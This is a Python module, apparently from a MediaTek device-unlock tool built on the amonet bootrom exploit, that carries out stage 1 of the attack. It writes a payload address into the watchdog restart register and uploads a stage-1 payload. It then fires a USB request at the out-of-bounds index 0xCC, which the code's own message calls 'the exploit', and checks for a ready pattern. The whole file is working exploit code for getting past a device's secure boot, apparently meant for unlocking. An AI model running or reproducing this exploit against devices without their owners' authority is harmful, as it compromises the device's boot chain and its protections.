from __future__ import annotations

import struct
from typing import TYPE_CHECKING

from firebreak.amonet.payload import NotReadyError
from firebreak.mediatek.libusb import ELEVATES, trigger
from firebreak.mediatek.usbdl import WORD_SIZE, ProtocolMismatchError

if TYPE_CHECKING:
    from firebreak.mediatek.usbdl import Bootrom

LADDER = range(0xF, 0, -1)
PAYLOAD_ADDRESS = 0x100A00
STAGE1_READY = b"\xa1\xa2\xa3\xa4"
TRIGGER_INDEX = 0xCC
WATCHDOG_RESTART = 0x10007050


def refused(*, said: str) -> str:
    if not said:
        return ""
    answered = f" The trigger itself answered: {said}."
    if ELEVATES:
        return answered
    return (
        answered + " A Linux kernel refuses a class request that names an"
        f" interface it has no record of, and this one names {TRIGGER_INDEX},"
        " which is a table index and not an interface: usbfs answers EINVAL and"
        " the bootrom never sees it. Being out of bounds is the exploit, so no"
        " index a kernel would send can replace it. Run this unlock from macOS"
    )


def reversed_word(*, value: int) -> int:
    return struct.unpack("<I", struct.pack(">I", value))[0]


def start_stage1(*, bootrom: Bootrom, stage1: bytes) -> None:
    bootrom.write_words(
        address=WATCHDOG_RESTART, words=(reversed_word(value=PAYLOAD_ADDRESS),)
    )
    for step in LADDER:
        bootrom.read_words(
            address=WATCHDOG_RESTART - step * WORD_SIZE, count=step + 1, strict=False
        )
    bootrom.send_payload(payload=stage1)
    said = trigger(index=TRIGGER_INDEX)
    note = refused(said=said)
    try:
        ready = bootrom.read_exactly(
            label="stage 1 ready pattern", length=len(STAGE1_READY)
        )
    except ProtocolMismatchError as error:
        message = f"{error}.{note}"
        raise NotReadyError(message) from error
    if ready != STAGE1_READY:
        message = (
            f"stage 1's ready pattern: expected {STAGE1_READY!r}, got {ready!r}.{note}"
        )
        raise NotReadyError(message)
